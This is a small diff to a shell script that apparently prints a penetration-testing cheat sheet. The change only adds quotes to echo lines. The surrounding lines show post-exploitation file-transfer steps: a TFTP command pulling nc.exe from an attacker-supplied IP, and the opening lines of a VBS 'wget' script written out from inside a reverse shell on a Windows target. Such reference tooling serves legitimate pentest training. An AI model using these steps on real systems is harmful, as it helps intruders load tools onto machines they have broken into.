@@ -288,10 +288,10 @@ echo "    tftp -i $ip GET nc.exe"
 
 
 function help-filetransfer-vbs {
-echo ${white}[i]  When FTP/TFTP fails you, this wget script in VBS was the go to on Windows machines.${reset}
-echo
-echo ${red}${bold}[1]   In reverse shell
-echo $green
+echo "${white}[i]  When FTP/TFTP fails you, this wget script in VBS was the go to on Windows machines.${reset}"
+echo ""
+echo "${red}${bold}[1]   In reverse shell"
+echo "$green"
 cat << EOF
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
